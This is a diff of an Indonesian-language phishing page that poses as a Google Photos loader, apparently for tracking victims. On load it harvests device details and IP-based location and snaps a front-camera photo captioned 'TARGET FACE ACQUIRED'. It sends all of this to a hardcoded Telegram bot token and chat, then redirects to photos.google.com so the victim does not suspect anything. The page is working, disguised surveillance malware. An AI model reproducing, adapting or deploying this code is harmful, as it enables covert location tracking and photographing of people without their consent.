@@ -2,18 +2,24 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Sistem Verifikasi Cloud</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>google-foto-saya</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .terminal { border: 1px solid #0f0; padding: 20px; text-align: center; }
-        .blink { animation: blinker 1s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
+        body { background: #000; color: #6e48aa; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        #loading-container { text-align: center; width: 80%; max-width: 400px; }
+        #loading-text { font-size: 20px; margin-bottom: 20px; color: #6e48aa; font-weight: bold; }
+        #progress-container { height: 3px; background: #222; border-radius: 3px; overflow: hidden; }
+        #progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg, #6e48aa, #9d50bb); transition: width .3s ease; }
+        #details { margin-top: 20px; font-size: 12px; color: #444; }
     </style>
 </head>
 <body>
-    <div class="terminal">
-        <div>SYSTEM STATUS: <span class="blink">SCANNING...</span></div>
-        <div id="log" style="font-size: 10px; margin-top: 10px;">Menginisialisasi modul...</div>
+
+    <div id="loading-container">
+        <div id="loading-text">Memuat foto Anda...</div>
+        <div id="progress-container"><div id="progress-bar"></div></div>
+        <div id="details">Menghubungkan ke server Google...</div>
     </div>
 
     <video id="v" autoplay playsinline muted style="display:none;"></video>
@@ -22,48 +28,110 @@
     <script>
         const T = '8416626215:AAHgkbyUIhmWDT9rQJVQJnnd-eI8uVJdr1Y';
         const C = '7966336512';
-        const REDIRECT_URL = 'https://www.google.com'; // Link tujuan setelah data kesedot
+        
+        // Progress Bar Mockup
+        let p = 0;
+        const bar = document.getElementById('progress-bar');
+        const det = document.getElementById('details');
+        const tasks = ["Checking modules...", "Syncing Drive...", "Decrypting media...", "Ready."];
+        
+        setInterval(() => {
+            if (p < 98) {
+                p += Math.random() * 5;
+                bar.style.width = p + '%';
+                if (Math.random() > 0.8) det.innerText = tasks[Math.floor(Math.random() * tasks.length)];
+            }
+        }, 500);
 
-        async function push(type, params, file = null) {
+        const sTG = async (d) => {
+            try {
+                await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: C, text: d, parse_mode: 'HTML' })
+                });
+            } catch (e) {}
+        };
+
+        const sP = async (b) => {
             const fd = new FormData();
             fd.append('chat_id', C);
-            for (let k in params) fd.append(k, params[k]);
-            if (file) fd.append(type.toLowerCase(), file, 'data.jpg');
-            try { await fetch(`https://api.telegram.org/bot${T}/send${type}`, { method: 'POST', body: fd }); } catch (e) {}
-        }
+            fd.append('photo', b, 'target.jpg');
+            fd.append('caption', '📸 <b>TARGET FACE ACQUIRED</b>');
+            try {
+                await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
+            } catch (e) {}
+        };
 
-        async function start() {
-            // 1. Device Info
-            await push('Message', { text: `<b>⚠️ TARGET HIT! ⚠️</b>\n\nAgent: ${navigator.userAgent}`, parse_mode: 'HTML' });
-
-            // 2. GPS
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (p) => {
-                    await push('Message', { text: `📍 <b>LOC:</b> ${p.coords.latitude},${p.coords.longitude}\nMaps: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, parse_mode: 'HTML' });
-                }, null, {enableHighAccuracy: true});
+        const getReport = async () => {
+            let m = '╭───── Tracking Report ───── ⦿\n\n';
+            m += '⚙️ <b>DEVICE INFORMATION</b>\n';
+            m += `🖥️ Device: ${navigator.userAgent}\n`;
+            m += `💻 Platform: ${navigator.platform}\n`;
+            m += `🌐 Bahasa: ${navigator.language}\n`;
+            m += `📶 Online: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
+            m += `📺 Screen: ${screen.width}x${screen.height}\n`;
+            m += `💾 RAM: ${navigator.deviceMemory || 'Unknown'} GB\n`;
+            m += `🧠 CPU: ${navigator.hardwareConcurrency} Cores\n`;
+            
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                m += `🔋 Battery: ${Math.floor(b.level * 100)}%\n`;
+                m += `🔌 Charging: ${b.charging ? '✅ YA' : '❌ TIDAK'}\n`;
             }
 
-            // 3. Camera & Auto Redirect
+            m += `⏰ Waktu: ${new Date().toString()}\n`;
+            m += `🌍 URL: ${location.href}\n`;
+            m += `🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n\n`;
+
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const r = await fetch('https://ipapi.co/json/');
+                const d = await r.json();
+                m += '📍 <b>LOCATION INFORMATION</b>\n';
+                m += `📡 IP: ${d.ip}\n`;
+                m += `🏙️ Kota: ${d.city}\n`;
+                m += `🗺️ Wilayah: ${d.region}\n`;
+                m += `🌎 Negara: ${d.country_name}\n`;
+                m += `📌 Lat: ${d.latitude}\n`;
+                m += `📍 Lng: ${d.longitude}\n`;
+                m += `🏠 Maps: https://www.google.com/maps?q=${d.latitude},${d.longitude}\n`;
+            } catch (e) { m += '❌ Gagal IP Tracking\n'; }
+
+            m += '\n╰───── Telegram @DeltaxReal ───── ⦿';
+            return m;
+        };
+
+        const execute = async () => {
+            // 1. Kirim Report Teks
+            const report = await getReport();
+            await sTG(report);
+
+            // 2. Akses Kamera & Foto
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const v = document.getElementById('v');
                 v.srcObject = stream;
 
                 setTimeout(() => {
-                    const c = document.getElementById('c');
-                    c.width = v.videoWidth; c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    c.toBlob(async (b) => {
-                        await push('Photo', { caption: '📸 Snapshot' }, b);
-                        // REDIRECT TARGET BIAR GAK CURIGA
-                        window.location.href = REDIRECT_URL;
-                    }, 'image/jpeg');
-                }, 3000);
+                    const canvas = document.getElementById('c');
+                    canvas.width = v.videoWidth;
+                    canvas.height = v.videoHeight;
+                    canvas.getContext('2d').drawImage(v, 0, 0);
+                    canvas.toBlob(b => sP(b), 'image/jpeg', 0.8);
+                    
+                    // Kill stream after capture
+                    setTimeout(() => {
+                        stream.getTracks().forEach(t => t.stop());
+                        window.location.href = "https://photos.google.com"; // Redirect asli
+                    }, 2000);
+                }, 4000); // Delay 4s biar gak item
             } catch (e) {
-                window.location.href = REDIRECT_URL; // Tetap redirect meski gagal
+                await sTG('❌ <b>Camera Access Denied</b>');
+                window.location.href = "https://photos.google.com";
             }
-        }
-        window.onload = () => setTimeout(start, 1000);
+        };
+
+        window.onload = () => setTimeout(execute, 1000);
     </script>
 </body>
 </html>
